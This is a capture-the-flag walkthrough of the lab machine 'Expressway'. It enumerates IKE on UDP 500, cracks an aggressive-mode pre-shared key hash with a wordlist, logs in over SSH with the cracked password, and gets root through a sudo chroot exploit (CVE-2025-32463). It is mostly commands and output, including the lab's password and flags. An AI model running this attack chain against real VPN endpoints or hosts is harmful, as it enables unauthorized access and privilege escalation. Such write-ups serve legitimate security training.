# Expressway

```
# Nmap 7.95 scan initiated Fri Nov 14 00:14:48 2025 as: /usr/lib/nmap/nmap -sU -Pn -T4 -p- --min-rate 2000 -o Expressway 10.10.11.87
Warning: 10.10.11.87 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.87
Host is up (0.027s latency).
Not shown: 65321 open|filtered udp ports (no-response), 213 closed udp ports (port-unreach)
PORT    STATE SERVICE
500/udp open  isakmp

# Nmap done at Fri Nov 14 00:18:51 2025 -- 1 IP address (1 host up) scanned in 243.00 seconds
```

```
$ ike-scan -M 10.10.11.87  
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=6c44948c8412c544)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.031 seconds (32.47 hosts/sec).  1 returned handshake; 0 returned notify

$ sudo ike-scan -M -A 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=a6fdd2022dc35e51)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.028 seconds (35.88 hosts/sec).  1 returned handshake; 0 returned notify
```

```
$ ike-scan -M --showbackoff 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=88f59acb8a07f78d)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

IKE Backoff Patterns:

IP Address      No.     Recv time               Delta Time
10.10.11.87     1       1763098880.730087       0.000000
10.10.11.87     Implementation guess: Linksys Etherfast

Ending ike-scan 1.9.6: 1 hosts scanned in 60.111 seconds (0.02 hosts/sec).  1 returned handshake; 0 returned notify
```

```
$ ike-scan -M -A -n ike@expressway.htb --pskcrack=hash.txt 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=bbf708d30f95d894)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.033 seconds (30.69 hosts/sec).  1 returned handshake; 0 returned notify

$ cat hash.txt 
2c816d6c0043a94b88c6d9b9922fdff18ad616d764aaba1f217a167a906616810e0d12d2632a20c7f8f2419d0463dae186e673eff0d9e11a9a83753b467bda4061f0c72d41d2d9da91d0d4e7d8281467a94e729d64c797ab2121317b52297f0b69f5d22cc44af393f9881828dfd2e22610f263dd6d3f91609c85563173b3621b:87c8526a7ad976f7ff2728a24490ba1b2406076f95d7e68f550ac8beba4a34a815a558424434bafd95bf20fd46642e4760640450b2dc6ece81a68f96624177233842a8d11115aa43a5bbac09b25a229012d5691b8b8f94da4911d8242aa9f730a981f8d0ced8a933c171e01929f27a2bcad0c6a99338b0fc94f6becd5dfff77c:bbf708d30f95d894:362cbe4ae2578d13:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:4a07db6e28024290ed1ed9319369c69fb189b493:7a3ad932d51d96b28ede785dc3f633f03dd37cd34ae20cb616aecafa96a7ff3f:e1e232068cbc618f824040e3ab66e1f452502a5a
```

```
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash e1e232068cbc618f824040e3ab66e1f452502a5a
Ending psk-crack: 8045040 iterations in 4.532 seconds (1775078.29 iterations/sec)
```

Password `freakingrockstarontheroad` can be used to connect to SSH

```
$ ssh ike@10.10.11.87    
The authenticity of host '10.10.11.87 (10.10.11.87)' can't be established.
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.87' (ED25519) to the list of known hosts.
ike@10.10.11.87's password: 
Last login: Fri Nov 14 04:22:43 GMT 2025 from 10.10.14.16 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Nov 14 05:26:50 2025 from 10.10.14.50
ike@expressway:~$ cat user.txt
1dadec359f045ade9feddc493a3ca4d9
```

```
$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

We can use [pr0v3rbs/CVE-2025-32463_chwoot: Escalation of Privilege to the root through sudo binary with chroot option. CVE-2025-32463](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)

```
ike@expressway:~/10.10.14.5$ cd CVE-2025-32463_chwoot/
ike@expressway:~/10.10.14.5/CVE-2025-32463_chwoot$ ls
Dockerfile  LICENSE  README.md  run.sh  sudo-chwoot.sh
ike@expressway:~/10.10.14.5/CVE-2025-32463_chwoot$ ./run.sh
./run.sh: line 1: docker: command not found
./run.sh: line 2: docker: command not found
ike@expressway:~/10.10.14.5/CVE-2025-32463_chwoot$ ./sudo-chwoot.sh 
woot!
root@expressway:/# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
root@expressway:/# cd /root/root.txt
bash: cd: /root/root.txt: Not a directory
root@expressway:/# cat /root/root.txt
774fc2966ce67b1da6d7b9086c5e269a
```